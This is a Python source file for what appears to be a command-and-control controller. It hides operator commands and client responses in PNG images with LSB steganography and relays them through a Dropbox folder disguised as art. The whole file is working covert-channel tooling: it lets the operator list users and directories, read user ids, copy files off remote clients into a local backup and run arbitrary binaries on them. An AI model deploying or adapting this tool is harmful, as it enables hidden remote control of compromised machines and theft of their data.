import dropbox
import sys
import select
import time
from datetime import datetime, timedelta
from stegano import lsb
from randimage import get_random_image
import io
import os
import matplotlib


HEARTBEAT_PERIOD = 180

CHECK_PERIOD = 30

TIMEOUT = HEARTBEAT_PERIOD*4

tmp_path = None
backup_path = None

def current_datetime():
    return datetime.now().strftime("%d/%m/%Y %H:%M:%S")


def init(access_token):
    access_token = sys.argv[1]
    dbx = dropbox.Dropbox(access_token)

    if len(dbx.files_list_folder('').entries) == 0:
        dbx.files_create_folder('/art')

    for entry in dbx.files_list_folder('').entries:
        print(entry.name)

    return dbx


def print_prompt():
    print("\nType 1-6 to select a feature")
    print("1 - list of users currently logged in")
    print("2 dir_path - list content of specified directory")
    print("3 - id of current user")
    print("4 file_path - copy a file in specified path")
    print("5 bin_path - execute a binary from specified path")
    print("6 - select client")
    print("7 - exit")


def handle_client_selection(clients):
    print("\nSelect client name for sending commands")
    for i, client in enumerate(list(clients)):
        print(str(i) + " " + client)
    print("Type 0-" + str(len(clients)-1) + " to select a client")

    i, o, e = select.select([sys.stdin], [], [], 15)
    if i:
        input_string = sys.stdin.readline()
        words = input_string.strip().split()
        if len(words) != 1 or int(words[0]) < 0 or int(words[0]) >= len(clients):
            print("Error - Invalid Client")
        else:
            return int(words[0])
    else:
        print("Timing out input to perform logic, wait for prompt...")
        print("")

    return -2    

def handle_command_selection(dbx, clients, selected_client):
    print_prompt()
    i, o, e = select.select([sys.stdin], [], [], 15) #timeout after 15 seconds

    commands = ['who', 'ls', 'id', 'cp', 'execute']
    if i:
        input_string = sys.stdin.readline()
        words = input_string.strip().split()
        if selected_client == -1 and words[0] not in ['6', '7']:
            print("Error - Select a client first")
        elif len(words) > 2 or len(words) < 1 or words[0] not in ['1','2','3','4', '5', '6', '7']:
            print("Error - Invalid command")
        elif words[0] in ['2','4', '5'] and len(words) != 2:
            print("Error - Invalid command missing argument")
        elif len(words) == 2 and words[0] not in ['2','4','5','6']:
            print("Error - Invalid command")
        elif words[0] == '6':
            return handle_client_selection(clients)
        elif words[0] == '7':
            return -1
        elif words[0] in ['2','4', '5']:
            execute_command(dbx, commands[int(words[0]) - 1] + ' ' + words[1], list(clients)[selected_client])
        else: 
            execute_command(dbx, commands[int(words[0]) - 1], list(clients)[selected_client])
        print("")
    else:
        print("Timing out input to perform logic, wait for prompt...")
        print("")

    return -2


def send_heartbeat(dbx, clients):
    #print(current_datetime() + " Sending heartbeat")
    for entry in dbx.files_list_folder('/art').entries:
        if not entry.name in clients.keys():
            continue
        print(current_datetime() + " Sending heartbeat to " + entry.name)
        dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)

        execute_command(dbx, 'heartbeat', entry.name)


def execute_command(dbx, command, client):
    header = current_datetime() + "|REQUEST|" + command + "|;"
    print('Executing ', header)
     
    for entry in dbx.files_list_folder('/art').entries:
        if entry.name == client:
            dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)

    message = lsb.reveal(tmp_path + client, lsb.generators.eratosthenes())
    message += header 
    secret = lsb.hide(tmp_path + client, message,  lsb.generators.eratosthenes())

    buf = io.BytesIO()
    secret.save(buf, format='PNG')
    dbx.files_upload(buf.getvalue(), '/art/' + client, mode=dropbox.files.WriteMode.overwrite)


def process_files(dbx, last_check, clients):
    for entry in dbx.files_list_folder('/art').entries:
        if not entry.name in clients.keys():
            continue

        dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)

        message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())

        for line in message.split(';')[:-1]:
            fields = line.split('|')
            #print(fields)
            response_time = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")     
            print("Received")
            print(fields)           
            if last_check < response_time and fields[1] == 'RESPONSE':
                if fields[2] == 'heartbeat' or fields[2] == 'register':
                    print("Heartbeat detected")
                    clients[entry.name] = response_time
                elif fields[2].split(' ')[0] == 'cp':
                    print(fields[3])
                    file_name = fields[3].split('\n')[1]
                    if file_name != 'cp error - no such file':
                        dbx.files_download_to_file(backup_path + file_name, '/art/' + file_name)
                        dbx.files_delete('/art/' + file_name)
                else:
                    print(fields[3])


def init_clients():
    clients = dict()
    for entry in dbx.files_list_folder('/art').entries:
        dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)

        message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())

        print(message.split(';'))
        for line in message.split(';')[:-1]:
            fields = line.split('|')
            clients[entry.name] = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")

    return clients

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Error - Invalid Call")
        print("Usage: python3", sys.argv[0], "APP_ACCESS_TOKEN TMP_DIR_PATH BACKUP_DIR_PATH")
    else:
        tmp_path = sys.argv[2]
        backup_path = sys.argv[3]
        for path in [tmp_path, backup_path]:
            if not os.path.exists(path):
                os.makedirs(path)

        dbx = init(sys.argv[1])
        
        #secret = lsb.hide("./cute_in.png", "Hello world!\n",  lsb.generators.eratosthenes())
        #secret.save("./cute_out.png")

        clients = init_clients()

        print("Registered clients")
        for k in clients.keys():
            print(k)
        print("")

        last_heartbeat = datetime.now()
        last_check = datetime.now()

        selected_client = -1

        while True:
            print("Selected client " + str(selected_client))

            check_diff = datetime.now() - last_check
            if check_diff.seconds > CHECK_PERIOD: 
                tmp = datetime.now()
                process_files(dbx, last_check, clients)
                last_check = tmp

                for client in list(clients):
                    client_diff = datetime.now() - clients[client]
                    if client_diff.seconds > TIMEOUT:
                        clients.pop(client, None)
                        selected_client = -1
            
            heartbeat_diff = datetime.now() - last_heartbeat
            if heartbeat_diff.seconds > HEARTBEAT_PERIOD:
                tmp = datetime.now()
                send_heartbeat(dbx, clients)
                last_heartbeat = tmp

            # read command
            res = handle_command_selection(dbx, clients, selected_client) 
            if res == -1:
                break
            elif res >= 0:
                selected_client = res



""" if __name__ == "__main__":
    img_size = (128,128)
    img = get_random_image(img_size)

    matplotlib.image.imsave('test.png', img)
    secret = lsb.hide("./test.png", "Hello world!\n",  lsb.generators.eratosthenes())
    secret.save("./test.png")

    for i in range(100):
        print(i)
        message = lsb.reveal("./test.png", lsb.generators.eratosthenes())
        message += str(i) + '\n'
        secret = lsb.hide("./test.png", message,  lsb.generators.eratosthenes())
        secret.save("./test.png")
        #lsb.hide("./test.png", message,  lsb.generators.eratosthenes())

    print("Out")
    print(lsb.reveal("./test.png", lsb.generators.eratosthenes())) """

""" if __name__ == '__main__':
    #test_str = "30/12/2023 19:56:59|REQUEST|ls /etc/|ahston|"
    #print(test_str.split('|'))
    dbx = init(sys.argv[1])
    #execute_command(dbx, 'heartbeat', 'test_test.png')

    client = 'incising.png'
     
    for entry in dbx.files_list_folder('/art').entries:
        if entry.name == client:
            dbx.files_download_to_file("./" + entry.name, entry.path_lower)

    message = lsb.reveal(client, lsb.generators.eratosthenes())
    
    print(message.split(';')[0].split('|')) """